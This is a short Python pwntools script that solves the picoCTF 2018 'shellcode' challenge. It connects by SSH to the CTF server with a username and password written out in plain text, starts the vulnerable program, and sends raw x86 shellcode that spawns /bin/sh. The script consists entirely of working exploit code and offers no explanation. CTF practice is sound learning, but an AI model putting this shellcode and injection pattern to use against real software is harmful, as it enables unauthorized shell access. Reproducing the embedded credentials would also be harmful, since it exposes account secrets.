from pwn import *

s=ssh(host="2018shell.picoctf.com",user="mhayad",password="mhayad11")
proc=s.run('cd /problems/shellcode_1_cec2eb801137d645a9f15b9b6af5347a; ./vuln')
proc.recvuntil("Enter a string!")
shell="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
proc.sendline(shell)
proc.interactive()
